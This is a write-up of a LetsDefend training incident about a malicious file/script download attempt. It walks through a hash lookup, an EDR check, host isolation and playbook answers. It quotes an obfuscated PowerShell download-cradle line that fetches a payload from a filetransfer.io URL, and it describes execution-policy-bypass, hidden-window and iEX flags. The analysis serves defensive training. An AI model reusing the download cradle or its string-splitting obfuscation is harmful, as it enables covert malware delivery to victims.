# Lets-Defend-Incident-Response-8
 Malicious File/Script Download Attempt

**Summary:**

In this incident the alert was generated due to Malicious File/Script Download Attempt. I start off by looking at the file hash given, The file ended up being tagged as malicious and it ended up being a PowerShell download cradle from filetransfer.io. Luckily this was blocked and looking through the logs I dont see any communication hinting this was successful. But I did notice multiple encoded PowerShell commands followed by a rundll32.exe command to execute a .dll file from a user’s Temp folder. But seeing these obfusicated messages were very suspicious, so as much as I can do in this incident, I isolate the server and would escalte to my suprervisor.


**Incident Response:**

I start by selecting `>>` to create case and take ownership of incident. Also noting all information given.

<img width="708" alt="1" src="https://github.com/user-attachments/assets/47da3d0c-532c-43de-ba65-403baf149f28">

Since I was given the file hash, I can look that up in VirusTotal

![Screenshot 2024-12-02 105625](https://github.com/user-attachments/assets/ca112b4a-ee1f-427c-994a-688c7a38231e)

Then I start my playbook.

![Screenshot 2024-12-02 105103](https://github.com/user-attachments/assets/95980dda-6d52-4fc5-8cea-c413563a45e1)

To find this info I can gather more information 

After looking up the file, I can see the shell commands, and see they are very suspicous.

![Screenshot 2024-12-02 110604](https://github.com/user-attachments/assets/bf3a1f02-66fd-4f4f-b778-db8c3c62ea49)

Looking at a line like: `(('D'+'o'+'w'+'n'+'l'+'o'+'a'+'d'+'s'+'tri'+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+'n'+'g')).InVokE((('https://filetransfer.io/data-package/UR2whuBv/download'))))`

This type of obfusication is very suspicous and usually is a sign an attacker is trying to avoid detection, and invokes a download or interaction with an external source of `filetransfer.io`.

Now Id like to see who the source IP is by checking in the EDR.

I can see there is a client endpoint in network that is associated with the source IP.

![Screenshot 2024-12-02 111502](https://github.com/user-attachments/assets/34ea80dd-8123-4073-acda-f4553b1b16bf)

Looking in ther terminal history I find a couple malicous looking scripts.

![Screenshot 2024-12-02 111933](https://github.com/user-attachments/assets/a9afd8b6-20a0-4685-9491-d62c6a9670f4)

This script looking at it gives away a couple things.

* The command PoweRSHElL -eXECuTIonpOli BYpAsS disables PowerShell's security restrictions on script execution, allowing malicious scripts to run.
* Flags like -nop, -WIND hidDEN, and -noniNTeRaCtI ensure that the PowerShell window does not show up and does not require user interaction, operating stealthily.
* The script uses iEX to execute dynamically created code, often used to execute malicious payloads in memory.

Finding this information I would Isolate this affected server, and escalate to my supervisor.

![Screenshot 2024-12-02 112343](https://github.com/user-attachments/assets/6c20c1f5-84e3-4c72-a52f-5cebb3e6535d)

Going back to my playbook 

![Screenshot 2024-12-02 112439](https://github.com/user-attachments/assets/3ec72df8-c9fd-4251-8b50-e8bdeb92df63)

* This would be `other` since the options given dont apply.

![Screenshot 2024-12-02 112732](https://github.com/user-attachments/assets/18534a60-b8fd-4375-803a-42df2dc88937)

* Since I just quarantined it I select `Quarantined` 

![Screenshot 2024-12-02 113045](https://github.com/user-attachments/assets/4f734855-e1b5-43bf-94fa-d7fb7bf6f787)

* I can say this was malicous since the powershell command found had many indicators.

* For the C2 address I did not find one since there wasnt any communications over ther logs.

![Screenshot 2024-12-02 113543](https://github.com/user-attachments/assets/ca073c85-98fc-455e-966a-da7c085cbca5)

* I select `Not Accessed` since the lack of communication

![Screenshot 2024-12-02 113947](https://github.com/user-attachments/assets/b70d1a6b-19cb-4c02-9417-ec35a7c19c8b)

* I add my artificacts.

![Screenshot 2024-12-02 114242](https://github.com/user-attachments/assets/d51bef16-cc5e-49af-b844-1ae394dd1c0b)

* Then add a quick description.

![Screenshot 2024-12-02 114509](https://github.com/user-attachments/assets/659f910e-d549-47fa-83eb-56d0e1c49987)




